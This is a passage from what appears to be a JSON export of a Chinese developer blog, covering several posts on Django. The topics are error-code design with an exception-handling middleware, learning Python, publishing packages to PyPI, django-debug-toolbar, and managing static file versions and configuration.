在满足使用需求、考虑扩展的情况下，短的错误码更方便维护和更新。腾讯开放平台的错误码，就显得特别冗长，即使遇到过一次错误，第二次出现时，也很难让人想起来。\n包含更多信息 新浪开放平台的错误码通过首位区分系统、服务级的错误。后面紧跟着模块代码和具体错误代码，非常容易定位错误。包含更多信息，意味着更长的错误码，这与长度足够短的建议相冲突。怎样选择合适的长度，需要考虑系统的复杂性。如果系统很复杂、需要表示很多状态，那么当然是优先满足系统需要，使用长的错误码，包含更多的错误信息。\n字面能够望文生义\n微信支付平台的错误码，就特别容易理解其含义。通过几个简单的动作和关键字组合，比如，NO、LACK、DATA、PARAMS，不需要错误码对照表，就能八九不离十的猜到错误含义。当然，还有些比较长的错误码，OUT_TRADE_NO_USED， 编码和理解会比较费力。\n充分利用达成共识的编码\n返回为0 ，表示请求正常，返回为 \u0026lt;0 ，表示异常，不需要文字的说明，使用达成共识的编码能显著降低沟通的成本。需要注意的是还有一个共识，特别是 Web 开发者，HTTP 状态码是最重要的编码共识。腾讯开放平台和微信开发平台都采用了大量 4XXX 表示客户端错误，而 5XXX 表示服务内部移除。不需要查看错误码对照表，开发者就能基本定位哪里发生了错误，再利用错误码对照表就能具体到程序逻辑的错误。\n2.3 错误码设计 2.3.1 根据模块划分编码 第1位 第2-3位 第4-5位 2 05 02 服务级错误（1为系统级错误） 服务模块代码 具体错误代码 对错误码划分区段，利用不同区段表示不同模块，再进行错误编码。这种编码方式的错误码数量会受到一定的限制，例如，10100-10199 使用完时，就不得不占用 102、103开头的错误码。当然，也可以在设计错误码时，预留充足的编码空间。例如：\n第1位 第2-4位 第5-8位 2 050 0200 2.3.2 使用英文短语编码 常见的系统错误码，都是仅使用阿拉伯数字，例如，Windows 系统中的错误码编码就是从 0000 到 15999 递增。使用数字的好处是处理效率高，容易编码。但是，一个数字能表达的含义有限。如果能使用短语，直接给出错误提示，更加直接有效。\n1 2 3 4 5 ERROR_INVALID_FUNCTION ERROR_INVALID_FUNCTION ERROR_PATH_NOT_FOUND ERROR_TOO_MANY_OPEN_FILES ERROR_ACCESS_DENIED 在代码层面，使用英文短语编码与数字编码的区别在于\n1 2 if (code == \u0026#34;10100\u0026#34;) if (code == \u0026#34;ERROR_ACCESS_DENIED\u0026#34;) 2.3.3 使用状态图编码 应用系统的本质是一个有限状态机，而一个错误码表示的就是应用系统的一种错误状态。设计错误码，也就是对应用系统状态进行编码。\n以一个简单的购物 Web 系统为例。应用系统只有三个逻辑模块，登录、前置条件检查、付款。\n此时，该应用系统有三个 login、front、pay 三个节点。①②③④⑤六条路径。\n1 2 3 4 # 路径 - ②⑤ ERROR_LOGIN_FRONT_NOT_XXX # 路径 - ②③④ ERROR_LOGIN_FRONT_PAY_NOT_XXX 如果新增了一个处理节点，exchange\n1 2 # 路径 - ②⑥ SUCCESS_LOGIN_FRONT_EXCHANGE 通过状态图进行错误编码的好处是，能够非常准确的描述哪里出错，系统扩展时，只需要新增节点和领边。这里当然也可以使用数字进行编码，比如节点 login （100），front（101），路径 - ②⑤ （100101XXX）。\n3. Django 如何处理异常 Debug = True 时，如果发生异常，Django 将程序运行时的相关信息回显在页面上，方便开发者调试。如下图：\nDebug = False 时，如果发生异常，Django 返回自定义或者内置的 500、404等页面。如下图：\n下面来看下 Django 是如何处理这些异常的：\n3.1 Djang 对 request 的处理 以本地开发为例，当浏览器发起一次请求时，Django 中的 wsgi 创建一个 WSGIHandler 对象处理请求。在\nWSGIHandler 对象中初始化环境变量，如果没有异常，则调用 self.get_response(request) 函数处理请求，返回 response 给 wsgi。\nget_response 定义在 django.core.handlers.base.py 文件中，下面是处理流程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 for middleware_method in self._request_middleware: response = middleware_method(request) if response: break ... if response is None: ... for middleware_method in self._view_middleware: response = middleware_method(request, callback, callback_args, callback_kwargs) if response: break ... response = wrapped_callback(request, *callback_args, **callback_kwargs) ... if response is None: try: response = wrapped_callback(request, *callback_args, **callback_kwargs) except Exception as e: for middleware_method in self._exception_middleware: response = middleware_method(request, e) if response: break if response is None: raise ... for middleware_method in self._response_middleware: response = middleware_method(request, response) ... return response 这张图能比较好的呈现整个处理流程逻辑.\n3.2 ExceptionBox Django 的中间件支持一种 Exception 的写法。当发生未捕获处理的异常时，执行中间件中定义的函数 process_exception，如果返回一个 response， 那么就可以结束整个流程。\n在 Django 工程中，需要一个异常处理和错误码统一管理的模块。于是便有了 ExceptionBox。\n数据的返回格式：\n1 2 3 4 5 6 { \u0026#39;code\u0026#39;: \u0026#39;XXXXXX\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;错误提示XXXX\u0026#39;, \u0026#39;result\u0026#39;: False, \u0026#39;data\u0026#39;: None } __init__.py\n1 2 # -*- coding: utf-8 -*- from .error import * base.py\n1 2 3 4 5 6 7 8 # -*- coding: utf-8 -*- from abc import ABCMeta class BaseReturn(Exception): __metaclass__ = ABCMeta class PreconditionFailed412(BaseReturn): status_code = 412 error.py\n1 2 3 4 5 6 7 8 # -*- coding: utf-8 -*- from __future__ import unicode_literals from . import base # Example class ERROR_LOGIN_FRONT_NOT_GIFT(base.PreconditionFailed412): message = \u0026#34;礼品不充足\u0026#34; middleware.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # -*- coding: utf-8 -*- import json import logging import traceback from django.http import JsonResponse from .base import BaseReturn logger = logging.getLogger(\u0026#39;root\u0026#39;) class ExceptionBoxMiddleware(object): def process_exception(self, request, exception): if not issubclass(exception.__class__, BaseReturn): return None ret_json = { \u0026#39;code\u0026#39;: exception.__class__.__name__, \u0026#39;message\u0026#39;: getattr(exception, \u0026#39;message\u0026#39;, \u0026#39;error\u0026#39;), \u0026#39;result\u0026#39;: False, \u0026#39;data\u0026#39;: None } response = JsonResponse(ret_json) response.status_code = getattr(exception, \u0026#39;status_code\u0026#39;, 500) _logger = logger.error if response.status_code \u0026gt;= 500 else logger.warning _logger(\u0026#39;status_code-\u0026gt;{status_code}, error_code-\u0026gt;{code}, url-\u0026gt;{url}, \u0026#39; \u0026#39;method-\u0026gt;{method}, param-\u0026gt;{param}, \u0026#39; \u0026#39;body-\u0026gt;{body}，traceback-\u0026gt;{traceback}\u0026#39;.format( status_code=response.status_code, code=ret_json[\u0026#39;code\u0026#39;], url=request.path, method=request.method, param=json.dumps(getattr(request, request.method, {})), body=request.body, traceback=traceback.format_exc() )) return response my_view.py\n1 2 3 import exceptionbox def home_view(request): raise exceptionbox.ERROR_LOGIN_FRONT_NOT_GIFT() 4. 参考 https://github.com/shaowenchen/django-exceptionbox https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81 https://httpstatuses.com/ ","description":"","id":492,"section":"post","tags":["博文","Django","Demo","错误码","中间件"],"title":"错误码设计以及 Django 的异常统一处理","uri":"https://www.chenshaowen.com/blog/error-code-design-and-unified-processing-in-django.html"},{"content":"1. 了解新语言产生的背景 ABC 是专门为非专业程序员设计的一种教学语言，但是由于其封闭，并未取得成功。1989年的圣诞节期间，吉多·范罗苏姆开发了一个新的脚本解释器，并命名为 Python，作为 ABC 语言的一种继承。新的脚本解释器开放，完美结合了 Unix Shell 和 C 的使用习惯。\n2. 了解新语言应用的场景 网站后台\n有大量成熟的框架，如 Django，Flask，Tornado 网络爬虫\nPython 写爬虫有很多库可用，如 Scrapy，Beautiful Soup 科学计算\n可以替代 R 语言和 Matlab，如 NumPy, SciPy, Matplotlib, Pandas 数据挖掘，机器学习，大数据\nScikit-learn，Libsvm，TensorFlow 系统部署，运维脚本\nShell 适合简单的系统管理工作，但涉及复杂的自动化任务还是需要 Python。 3. 了解新语言的特点 Python 的设计哲学是：优雅、明确、简单。Python 的开发哲学是：用一种方法，最好是只有一种方法来做一件事，有些类似 Unix。与其他语言非常不一样的是，Python 以缩进来确定语句块。\nPython 是一门面向对象的动态、解释型语言，具有出色的模块化特性。同时，Python 拥有大量的第三方开源包，可以直接使用，极大地提高了开发效率。Python 编写的代码，可读性强，特别适合多人大型项目的开发。但是 Python 的执行效率比不上 C/C++ 这类编译型语言。\n4. 学习新语言的数据结构 Python 中内置类型有整型 int，浮点型 float，布尔型 bool，字符串 str，列表 list，元组 tuple，字典 dict，集合 set。与 C 不同的是，Python 并不依赖于关键字定义各种类型。Python 是动态强类型语言，是通过运行时，自动选择合适的数据类型。字符串、列表、元组、集合、字典等复杂数据类型，并不是 C 语言的内置类型。\n5. 学习新语言的逻辑结构 if 条件判断结构\n1 2 3 4 5 6 7 condition = 1 if condition == 1: print 1 elif condition == 2: print 2 else: print 3 for 循环结构\n1 2 3 items = [\u0026#39;item1\u0026#39;, \u0026#39;item2\u0026#39;, \u0026#39;item3\u0026#39;] for item in items: print item while 循环结构\n1 2 3 4 5 sum, n = 0, 10 while n \u0026gt; 0: sum = sum + n n = n - 2 print sum Keywords: if; for; while;\n6. 学习定义一个独立模块 定义函数：\n1 2 def function_name(x): return -x 定义类：\n1 2 3 4 5 6 7 class ClassName: #经典类、旧类 def __init__(self): pass class NewClassName(object): #新类 def __init__(self): pass 在多继承中，新式类采用广度优先搜索，而旧式类是采用深度优先搜索。\n定义包：\nPython 中定义一个包，只需要在文件夹里面，创建一个 __init__.py文件即可，如：\n1 2 3 mypackage/__init__.py mypackage/test.py mypackage/views.py 那么在其他文件中，就可以通过 from mypackage import views 的语法，从 mypackage 这个包里面导入 views 。\n7. 做一个小的项目 尝试完成一次领域实践，是对这个领域最佳的入门方式。学习一门新的编程语言，成长最快的阶段在，利用这门编程语言完成项目需求期间。\nDjango 是一个十分优秀的 Python 写的 Web 程序框架，广泛用于数据驱动类的网站开发。Django 是一个大而全的开发框架，基本不需要额外的第三方配置，就可以快速地进行开发。\n笔者的小项目需求是：利用二维码扫码，查看在线简历。\n确定项目需求之后，会迎来一个手足无措的时期，不知道从哪里着手开始做项目。如果有一个过来人指导一下，那么很快就能开始编码了。不幸的是，笔者当时身边并没有这样一个人。在网上查阅资料后，最终选定了Jquery 、Foundation、Django 实现这个项目。\n实际上，笔者在此之前一直在写 C++ 程序，并没有 Python 的编程基础，仅仅是因为这个小项目，选定的技术栈后台使用的是 Django ，才开始学习 Python。\n除了掌握项目使用到的技术栈，在完成项目的过程中，还可以解锁调试技能、通过搜索引擎解决各种程序问题的能力。\n为了完成这个小项目，需要走出舒适区，突破原有的技术栈，最终获得快速的技术成长。\n8. 学习使用库完成任务 通常，发布者会将使用频率高、可以复用的功能，打包成库，提供给大家共同使用。\n库可以分为两类：\n一种是官方的库，通常质量比较高、会维护更新； 一种是第三方的库，质量参差不齐，需要自己甄别。 例如，Django 中提供了 from django.views.decorators.http import require_POST 装饰器用于确保 view 函数的请求方法是 POST。使用这个装饰器可以简化 view 函数中的条件判断，有利于编写简洁易读的代码。当然 ，Django 还有大量的第三方 App 可以下载使用，直接提供一个完整功能。\n在项目开发的过程中，合理地使用库会起到锦上添花的效果。\n9. 学习组织代码结构 研究怎样更好的组织项目的代码是一门管理科学。笔者之前也写过相关的博文\nDjango浅析与工程目录结构实践 讨论了 Django 工程的目录组织结构。\n好的项目代码结构需要学习一些高关注度的开源项目的经验，也需要注意输出，成为大家共同的标准，共同维护，产生影响力。\n10. 学习让代码易维护 代码维护分为两类：\nBug 易修复，需要代码具有良好的命名习惯、注释、日志输出，实现相同的功能编写尽量少的代码 新功能的扩展，通常是在原有逻辑上，创建新的分支。这类分支又可以分为代码级别和常量级别。我们需要的是通过常量的配置扩展新功能，而减少代码级别的修改 11. 提高代码复用率 随着使用新语言年限的增长，参与项目的增多，会出现一个显而易见的问题：在不同的项目中，会有一些非常类似的功能。甚至在开发新项目时，有时还会去以前项目中拷贝代码。\n这时，应该思考如何提高代码的复用率，如何提供公共组件。\n代码的复用可以分为：\n代码片段（Snippets）\n维护一个 Snippets List 是个不错的注意 公共组件（Components）\n公共组件需要从项目中分离，会有一定的工作量，但收益很大 从项目中分离公共组件的过程，需要关注模块内的高内聚，模块间的低耦合。在模块分离的过程中，我们会更加深入地去理解应用系统。这一过程的完成，又将极大地提高开发效率。\n更重要的是，我们不仅仅从项目中分离出一个公共组件，在使用其他人提供的公共组件时，也会变得容易。\n下一次项目开发时，需要一个新功能，你首先想到的可能不是编码，而是去公共组件库或 Github 搜索有没有类似的包，然后经过简单的改造就能在项目使用。\n12. 关注性能 针对 Web 应用，高并发、高可用、高一致性始终是亘古不变的议题。在对应用系统不断发起挑战时，那些隐藏的曾经被忽略的问题才会逐渐显现。在这个过程中，不断地发现应用系统的瓶颈，解决这些瓶颈，循环往复，不断加深对业务、对应用系统的理解。\n性能报告是性能测试输出的结果。性能报告就像质检报告一样，是让用户信任和使用产品的凭证。高并发、高可用、高一致，并不是口号，需要数据的举证，需要不断的优化性能。\n13. 源码阅读 阅读源代码有利于提高自己的代码水平。阅读 Python 解释器的源码，有利于编写高性能的代码。阅读 Django 源码有利于编写易维护、易更新的 Django App。从开始学习这门新语言时，就可以开始尝试阅读源代码。\n14. 参考 https://zh.wikipedia.org/zh-cn/Python ","description":"","id":493,"section":"post","tags":["博文","Python"],"title":"如何学习一门新的编程语言 - 以 Python 为例","uri":"https://www.chenshaowen.com/blog/how-to-learn-a-new-programming-language-taking-python-as-an-example.html"},{"content":" 最近笔者在思考，怎样提高开发效率。从网络爬虫到数据处理，然后到人工智能。Python 的强大之处在于：拥有一大批开箱即用的工具包，不必重复造轮子，极大地提高了开发的效率。那么为何不将项目中的功能模块化，打包成可复用的 Python 包呢？本文主要讲的是怎样将一个功能打包成 Python 包，并上传到 PyPi。\n1. 首先得有一个 Python 包 在 Python 开发的过程中，可以将功能非常明确的模块分离出来，作为一个单独的 Python 包。这样不仅有利于模块的维护和升级，更重要的是在项目开发的过程中，可以复用这些 Python 包。\n最近笔者的一个项目中，需要对 Django View 进行访问权限的控制。Django 自带的\nPermission 提供表级别的权限控制，django-guardian 提供对象级别的权限控制。但是，这个项目中并没有 Model，数据完全来自第三方接口。在 GitHub 上搜索无果之后，笔者决定开发一个基于 View 粒度的权限控制 Django App。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 django_view_permission ├── admin.py ├── apps.py ├── __init__.py ├── management │ ├── commands │ │ ├── clearviewpermission.py │ │ └── __init__.py │ └── __init__.py ├── middleware.py ├── migrations │ ├── 0001_initial.py │ └── __init__.py ├── models.py ├── settings.py ├── singnals │ ├── handlers.py │ ├── __init__.py ├── utils.py ├── LICENSE ├── MANIFEST.in ├── README.md └── setup.py 2. 打包源码 可以使用下面的命令打包源代码:\n1 python setup.py sdist 这样在当前目录的 dist 文件夹下，就会多出一个以 tar.gz 结尾的包。\n3. 上传包 3.1 注册账户 访问：https://pypi.python.org/pypi ，注册自己的账户 yourname:yourpassword。\n3.2 创建 .pypirc 配置文件 如果不配置 .pypirc 文件，上传包到 PyPi 时会提示 403 错误。.pypirc 文件用于上传包到 PyPi 时，验证权限。在用户根目录下创建文件 $HOME/.pypirc，内容如下：\n1 2 3 4 5 6 7 8 [distutils] index-servers = pypi [pypi] repository=https://upload.pypi.org/legacy/ username=[your_username] password=[your_password] 3.3 上传source 包 1 python setup.py sdist upload 3.5 安装测试 1 2 3 4 5 6 pip install django_view_permission Collecting django_view_permission Downloading django_view_permission-0.0.1.tar.gz Installing collected packages: django-view-permission Running setup.py install for django-view-permission ... done Successfully installed django-view-permission-0.0.1 ","description":"","id":494,"section":"post","tags":["博文","Python","Django","部署"],"title":"怎样打包一个 Python 包，并上传到 PyPi","uri":"https://www.chenshaowen.com/blog/how-to-pack-a-python-package-and-upload-it-to-pypi.html"},{"content":"1. 关于 Django 的性能 Django 是一个 Python 写的 Web 应用框架。使用 Django ，可以非常简单、高效地开发复杂的数据驱动的网站。同时，Django 非常注重组件的重用性、可插拔、敏捷开发、DRY（Don\u0026rsquo;t Repeat Yourself）。从一定程度上讲，Django 是一个很适合做业务逻辑实现的应用框架。\n笔者曾经利用 Docker 做过一次 Django 的性能测试，得到的结论是在 intel i5-5300 2.3GHz，8GB 内存，SSD 配置的笔记本电脑上，Django 的读取 DB 接口的并发只有 360 次请求/秒。\nDjango 牺牲性能，降低了学习成本，提高了开发效率。 通常，可以在如下几个方面优化 Django 的性能：\n数据库。 加缓存可能是最直接的方法，还可以优化查询语句 模板。 Django 自带的模板比较慢，可以试试 Mako， Jinja2 Python。 升级到 Python 3，利用 Python 3 中的新特性，例如，asyncio 如何找出 Django 的性能瓶颈呢？可以关注如下几个方面：\n执行了多少条 SQL 语句 有多少时间花费在数据库上 执行了什么特殊的查询操作，每次查询花费多长时间 这些查询是有什么代码生成的 渲染页面都用到了哪些模板 冷/热缓存是如果影响性能的 绝大部分的性能瓶颈是数据库部分，下面介绍 Django 的性能检测工具 django-debug-tools ，一个非常强大的 Django 性能检测工具。\n2. django-debug-tools 2.1 安装 1 pip install django-debug-toolbar 2.2 配置 settings.py\n1 2 3 4 5 6 7 8 9 10 11 INSTALLED_APPS = [ # ... \u0026#39;django.contrib.staticfiles\u0026#39;, # ... \u0026#39;debug_toolbar\u0026#39;, ] MIDDLEWARE = [ # ... \u0026#39;debug_toolbar.middleware.DebugToolbarMiddleware\u0026#39;, # ... ] 如果配置完，并没有显示 Panel ，那么你需要的是下面这个配置\n1 2 3 DEBUG_TOOLBAR_CONFIG = { \u0026#34;SHOW_TOOLBAR_CALLBACK\u0026#34;: lambda request: DEBUG, } url.py ```python from django.conf import settings from django.conf.urls import include, url if settings.DEBUG: import debug_toolbar urlpatterns = [ url(r\u0026#39;^__debug__/\u0026#39;, include(debug_toolbar.urls)), ] + urlpatterns 2.3 使用 重新启动 Django 工程，在页面右侧即可看到 Panel，提供各种参数的 Panel ，点击查看。\n3. django-debug-panel django-debug-toolbar 是一个不错的 Django 性能检测工具，但是 django-debug-toolbar 不能处理 Ajax 和非 HTML 请求。django-debug-panel 在 django-debug-toolbar 的基础上，提供了更好的单页面应用和 Ajax 请求的支持。\n3.1 安装 1 pip install django-debug-panel 3.2 配置 首先，安装配置 django-debug-toolbar。\nsettings.py\n1 2 3 4 INSTALLED_APPS = ( # ... \u0026#39;debug_panel\u0026#39;, ) 使用 panel 的中间件，替换 toolbar 的中间件。\nmiddlewares.py\n1 2 3 4 5 6 MIDDLEWARE_CLASSES = ( ... # \u0026#39;debug_toolbar.middleware.DebugToolbarMiddleware\u0026#39;, \u0026#39;debug_panel.middleware.DebugPanelMiddleware\u0026#39;, ... ) 安装 Chrome 插件 Django Debug Panel\n3.3 使用 重启 Django 工程和 Chrome 调试面板。刷新页面，即可看到每个接口，对应的 SQL 等相关信息。\n4. 第三方的 Panel django-debug-toolbar 还拥有一些第三方的 Panel，可以非常方便的与其他 Python 性能检测工具集成使用。\n4.1 Line Profiler debug_toolbar_line_profiler.panel.ProfilingPanel\nLine Profiler 可以对函数进行逐行分析，主要用于 CPU 密集型性能检测。\n4.2. Pympler pympler.panels.MemoryPanel\nPympler 是一个用来查看，监控 Python 对象内存的一个开发工具。\n5. 参考 https://github.com/recamshak/django-debug-panel https://mozillazg.github.io/2015/09/high-performance-django-note-1.html https://django-debug-toolbar.readthedocs.io/en/stable/ http://django-debug-toolbar.readthedocs.io/en/stable/panels.html ","description":"","id":495,"section":"post","tags":["博文","Django","工具","测试","性能","调试"],"title":"Django 调试工具 django-debug-toolbar","uri":"https://www.chenshaowen.com/blog/django-debug-toolbar.html"},{"content":" 为了快速地响应用户的需求、满足运营活动的需要，互联网产品通常有着非常高的发布频率。采用敏捷开发的方式，缩短了交付的周期，加快了产品的迭代，也给项目的文件管理带来了挑战。前端工程直接面向用户，首当其冲，最值得重视。频繁更新的图片、样式、交互，不同的版本文件，怎样保证用户获取一个可预期的结果呢？本文正是从这个问题出发，讨论相关的解决方案。\n1. 缓存方式 前端缓存分为两种：\n强缓存：浏览器在加载静态资源时，检查 Http Response Header 的 Expires 和 Cache-Control 两个字段。如果在有效期，那么使用浏览器缓存。 协商缓存：如果没有命中强缓存，浏览器会向服务器验证是否命中协商缓存。协商缓存实际上是在静态资源的 Header 上标记 Last-Modified、ETag，通过对比浏览器端、服务器端静态资源的这些值，判断是否是同一个文件。如果一致，则返回 304，Not Modified 表示命中协议缓存。否则，浏览器从服务器加载静态文件。 服务器缓存主要是 CDN 缓存：\nCDN ，也就是内容分发网络，是在现有网络的基础上，新增一层架构，提前将静态文件，分发到用户访问最佳的网络节点。当用户使用浏览器访问静态资源时，静态资源域名通过 DNS 解析，根据用户的地理位置，返回一个最佳访问的节点 IP 地址。浏览器拿到 IP 地址之后，再请求静态资源。\n2. 强制刷新缓存方式 强制刷新缓存是指：当缓存有效时，通过一定的技术手段，迫使浏览器不使用缓存，而从服务器请求静态资源。\n主要有两种方式：\n重新命名静态资源，如： app.js 更新为 app.a232nas9.js 静态资源链接添加变化的参数，如：app.js 更新为 app.js?v=20171017 在大型 Web 项目中，更倾向于使用第一种，重命名静态资源的方式实现静态资源的强制刷新。这是由于采用第二种方式，发布时，需要替换静态资源文件。文件替换时，CDN 不能即时完成更新。当仅部分静态资源完成更新时，如果有用户访问，会导致一些不可预期的错误。\n下面介绍几种 Django 中实现的静态文件版本管理的方式：\n2.1 通过 settings 中的变量管理版本 1，在 yourapp 下新建 context_processors.py 文件\ncontext_processors.py\n1 2 3 4 5 6 7 # -*- coding: utf-8 -*- from django.conf import settings def version(request): return { \u0026#39;VERSION\u0026#39;: settings.VERSION } 2，修改 settings.py 文件，新增如下内容：\n1 2 3 4 5 6 7 8 9 10 VERSION = \u0026#39;.1.0.0\u0026#39; TEMPLATES = [ { \u0026#39;OPTIONS\u0026#39;: { \u0026#39;context_processors\u0026#39;: [ \u0026#39;yourapp.context_processors.version\u0026#39;, ], }, }, ] 3、修改 html 中静态资源的引入方式\n静态资源重新命名方式\n1 2 \u0026lt;script src=\u0026#34;${STATIC_URL}js/app${VERSION}.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;${STATIC_URL}css/app${VERSION}.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; 静态资源链接添加变化的参数方式\n1 2 \u0026lt;script src=\u0026#34;${STATIC_URL}js/app.js?v=${VERSION}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;${STATIC_URL}css/app.css?v=${VERSION}\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; 每次发布之前，通过修改 settings.py 中 VERSION 变量的值，可以达到前端版本更新的目的。由于静态文件共用一个 VERSION 标识，如果仅仅更新了一个静态文件，其他带上 VERSION 标识的静态文件也将被更新。\n2.2 使用 ManifestStaticFilesStorage Django 中提供 ManifestStaticFilesStorage 类，允许 Django 从 staticfiles.json 文件中读取静态文件映射。staticfiles.json 中保存了类似访问 app.css 时，返回 app.s23324a.css 的对应关系。\n1，settings.py 设置\n1 2 3 STATIC_ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), \u0026#39;static\u0026#39;) STATICFILES_STORAGE = \u0026#39;django.contrib.staticfiles.storage.ManifestStaticFilesStorage\u0026#39; DEBUG = False 通过对 ManifestStaticFilesStorage 类的继承，复写相应的函数，还可以定制化静态文件名。\n2，修改 html 中静态资源的引入方式\n1 2 {% load static %} \u0026lt;link href=\u0026#34;{% static \u0026#34;css/app.css\u0026#34; %}\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; 3，收集静态文件\n1 python manage.py collectstatic 这样在 static 目录下 就会生成一个 staticfiles.json 文件。\n访问网页时，静态文件会被带上 hash 版本值。\n1 2 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/static/v/css/base.f0d165989b77.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/static/v/css/dashboard.4898e2e9983d.css\u0026#34; /\u0026gt; 2.3 使用 CachedStaticFilesStorage Django 中提供 CachedStaticFilesStorage 类，允许 Django 从缓存中读取静态文件映射。与 ManifestStaticFilesStorage 不同的是 CachedStaticFilesStorage 不需要创建一个映射文件，而是通过缓存来保存映射关系。\n1，settings.py 设置\n1 2 3 STATIC_ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), \u0026#39;static\u0026#39;) STATICFILES_STORAGE = \u0026#39;django.contrib.staticfiles.storage.CachedStaticFilesStorage\u0026#39; DEBUG = False 通过对 ManifestStaticFilesStorage 类的继承，复写相应的函数，还可以定制化静态文件名。\n2，设置缓存\n1 2 3 4 5 6 7 8 9 10 # 设置 memcache 或者 redis 缓存 CACHES = { \u0026#34;default\u0026#34;: { \u0026#34;BACKEND\u0026#34;: \u0026#34;redis_cache.cache.RedisCache\u0026#34;, \u0026#34;LOCATION\u0026#34;: \u0026#34;127.0.0.1:6379:1\u0026#34;, \u0026#34;OPTIONS\u0026#34;: { \u0026#34;CLIENT_CLASS\u0026#34;: \u0026#34;redis_cache.client.DefaultClient\u0026#34;, } } } 2，修改 html 中静态资源的引入方式\n1 2 {% load static %} \u0026lt;link href=\u0026#34;{% static \u0026#34;css/app.css\u0026#34; %}\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; 3，收集静态文件\n1 python manage.py collectstatic 这样在 static 目录下 就会生成一个 staticfiles.json 文件。\n3. 参考 https://www.cnblogs.com/lyzg/p/5125934.html http://www.cnblogs.com/smallc/p/4019642.html http://blog.thehumangeo.com/2013/05/01/dynamically-cache-static-files-using-django-and-nginx/ https://devblog.kogan.com/blog/a-hidden-gem-in-django-1-7-manifeststaticfilesstorage ","description":"","id":496,"section":"post","tags":["博文","Django","前端","JavaScript","文件","研发","版本"],"title":"Django 中对静态文件版本的控制","uri":"https://www.chenshaowen.com/blog/control-of-static-file-version-in-django.html"},{"content":"1. Django 静态文件分类 Django 静态文件分为两类：static 和 media。\nstatic： 是页面引用的 JS、CSS、Image 等文件 media：是用户上传的文件 2. 生产环境配置 生产环境，通常配置 Nginx 转发静态文件请求，而 Django 处理动态请求。\nnginx 配置\n1 2 3 4 5 6 7 location /media { alias /path/to/project/media; } location /static { alias /path/to/project/static; } 在部署时，需要执行 python manage.py collectstatic 命令将 INSTALLED_APPS 列表内的全部 Django App 的静态资源收集到 STATIC_ROOT 指定的目录。\n3. 开发环境配置 3.1 配置和使用 第一步，在 INSTALLED_APPS 中加入 \u0026lsquo;django.contrib.staticfiles\u0026rsquo;\n第二步，在 urls.py 中新增如下路由，仅在 settings.DEBUG==True 时生效，正式环境使用 Nginx 转发。\n1 2 3 4 5 6 7 8 if settings.RUN_MODE == \u0026#39;DEVELOP\u0026#39;: urlpatterns += patterns(\u0026#39;\u0026#39;, url(r\u0026#39;^media/(?P\u0026lt;path\u0026gt;.*)$\u0026#39;, \u0026#39;django.views.static.serve\u0026#39;, { \u0026#39;document_root\u0026#39;: settings.MEDIA_ROOT, }), url(r\u0026#39;^static/(?P\u0026lt;path\u0026gt;.*)$\u0026#39;, \u0026#39;django.views.static.serve\u0026#39;, {\u0026#39;document_root\u0026#39;: settings.STATIC_ROOT}), ) 第三步，在 settings 文件 TEMPLATES - OPTIONS - context_processors 配置中添加\n1 2 django.template.context_processors.static django.template.context_processors.media 第四步，在模板中使用 STATIC_URL、MEDIA_URL 变量\nstatic 文件\n1 2 3 4 \u0026lt;img src=\u0026#34;{{STATIC_URL}}test.png\u0026gt; # 或者 {% load staticfiles %} \u0026lt;img src=\u0026#34;{% static \u0026#39;img/logo.png\u0026#39; %}\u0026#34;\u0026gt; media 文件\n1 \u0026lt;source src=\u0026#34;{{ MEDIA_URL }}movie.ogg\u0026#34; type=\u0026#34;video/ogg\u0026#34;\u0026gt; 3.2 处理流程 第一步，Django 收到一个静态文件的请求，例如，/static/css/main.css\n第二步，Django 在 STATICFILES_DIRS 中寻找 css/main.css 这个文件\n如果第二步找到了，直接返回该文件，否则在 INSTALLED_APPS 列表内全部 Django App 的 static 目录下继续查找。\n4. static 相关变量 4.1 STATIC_ROOT 指定执行 python manage.py collectstatic 命令时，静态文件存储的目录\n4.2 STATIC_URL URL 映射，指定静态目录的 URL，默认值为：\n1 STATIC_URL = \u0026#39;/static\u0026#39; 4.3 STATICFILES_DIRS STATICFILES_DIRS 是一个列表，指定工程里哪些目录存放了静态文件。\n4.4 STATICFILES_STORAGE 使用 python manage.py collectstatic 命令收集静态文件时，Django 使用的文件存储引擎。如果需要将静态文件托管在其他地方，那么需要修改 STATICFILES_STORAGE 参数，实现相应的方法即可。默认值为：\n1 STATICFILES_STORAGE = \u0026#39;django.contrib.staticfiles.storage.StaticFilesStorage\u0026#39; 4.5 STATICFILES_FINDERS 在开发环境下 django.contrib.staticfiles 查找静态资源的顺序取决于 STATICFILES_FINDERS 的配置，STATICFILES_FINDERS 默认配置如下：\n1 2 3 4 STATICFILES_FINDERS = ( \u0026#39;django.contrib.staticfiles.finders.FileSystemFinder\u0026#39;, \u0026#39;django.contrib.staticfiles.finders.AppDirectoriesFinder\u0026#39;, ) django.contrib.staticfiles.finders.FileSystemFinder 用来从 STATICFILES_DIRS 指定的路径中查找静态文件 django.contrib.staticfiles.finders.AppDirectoriesFinder 是从 INSTALLED_APPS 列表内全部 Django App 的 static 目录中查找静态文件 5. media 相关变量 5.1 MEDIA_ROOT MEDIA 存储的是用户上传的文件，比如在 Model 里面的FileField 的文件。如果定义MEDIA_ROOT=C:\\media，那么 File = models.FileField(upload_to='file/')，上传的文件就会被保存到 C:\\media\\file\n在 settings 里面设置的 MEDIA_ROOT必须是绝对路径，可以这样写：\n1 2 3 PROJECT_ROOT = 